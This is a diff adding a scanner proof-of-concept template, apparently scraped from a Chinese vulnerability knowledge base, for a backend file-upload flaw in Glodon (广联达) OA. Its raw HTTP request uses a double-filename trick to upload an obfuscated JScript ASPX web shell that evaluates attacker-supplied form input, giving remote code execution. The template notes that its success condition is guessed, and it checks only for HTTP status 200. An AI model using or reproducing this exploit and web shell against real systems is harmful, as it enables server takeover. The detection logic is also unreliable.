@@ -1,0 +1,91 @@
+id: poc-539746046
+info:
+  name: 广联达OA 后台文件上传漏洞_wwo5mnlrprq8gl2u
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,unknown
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ''
+    fofa: 暂无
+http:
+- raw:
+  - 'POST /gtp/im/services/group/msgbroadcastuploadfile.aspx HTTP/1.1
+
+
+    X-Requested-With: Ext.basex
+
+
+    Accept: text/html, application/xhtml+xml, image/jxr, */*
+
+
+    Accept-Language: zh-Hans-CN,zh-Hans;q=0.5
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+
+    Accept: */*
+
+
+
+
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+
+    Content-Disposition: form-data; filename="1.aspx";filename="1.jpg"
+
+
+    Content-Type: application/text
+
+
+
+
+    <%@ Page Language="Jscript" Debug=true%>
+
+
+    <%
+
+
+    var FRWT=''XeKBdPAOslypgVhLxcIUNFmStvYbnJGuwEarqkifjTHZQzCoRMWD'';
+
+
+    var GFMA=Request.Form("qmq1");
+
+
+    var ONOQ=FRWT(19) + FRWT(20) + FRWT(8) + FRWT(6) + FRWT(21) + FRWT(1);
+
+
+    eval(GFMA, ONOQ);
+
+
+    %>
+
+
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+
+
+    # 响应代码特征
+
+    -1
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
